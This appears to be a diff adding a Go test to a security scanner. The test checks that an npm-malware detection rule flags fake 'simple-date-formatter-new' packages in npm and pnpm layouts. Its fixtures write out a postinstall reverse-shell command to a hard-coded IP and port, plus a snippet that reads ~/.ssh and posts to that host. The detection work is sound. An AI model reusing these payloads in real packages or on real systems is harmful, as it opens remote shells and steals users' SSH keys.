@@ -602,6 +602,58 @@ func TestScan_AmazonInspectorUibabaiUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorSimpleDateFormatterUnderNodeModules proves the
+// bounded walker reaches both package variants and artifact types in npm and
+// pnpm layouts without scanning a lookalike package carrying the same markers.
+func TestScan_AmazonInspectorSimpleDateFormatterUnderNodeModules(t *testing.T) {
+	reverseShell := []byte(`{"scripts":{"postinstall":"bash -c 'bash -i >& /dev/tcp/124.221.154.135/4444 0>&1'"}}`)
+	sshExfil := []byte(`const sshDir = path.join(os.homedir(), '.ssh'); const files = fs.readdirSync(sshDir); https.request('https://124.221.154.135/post', { method: 'POST' });`)
+	layouts := []struct {
+		name string
+		rel  string
+		raw  []byte
+	}{
+		{"package json npm", filepath.Join("node_modules", "simple-date-formatter-new-9", "package.json"), reverseShell},
+		{"package json pnpm", filepath.Join("node_modules", ".pnpm", "simple-date-formatter-new-10@1.0.0", "node_modules", "simple-date-formatter-new-10", "package.json"), reverseShell},
+		{"postinstall npm", filepath.Join("node_modules", "simple-date-formatter-new-10", "postinstall.js"), sshExfil},
+		{"postinstall pnpm", filepath.Join("node_modules", ".pnpm", "simple-date-formatter-new-9@1.0.0", "node_modules", "simple-date-formatter-new-9", "postinstall.js"), sshExfil},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, layout.raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", filepath.Base(payload))
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, layout.raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AmazonInspectorNPMMalwareFollowupUnderNodeModules proves the
 // bounded walker reaches the campaign's reviewed follow-up persistence files
 // in npm and pnpm layouts without broad-scanning unrelated package roots.
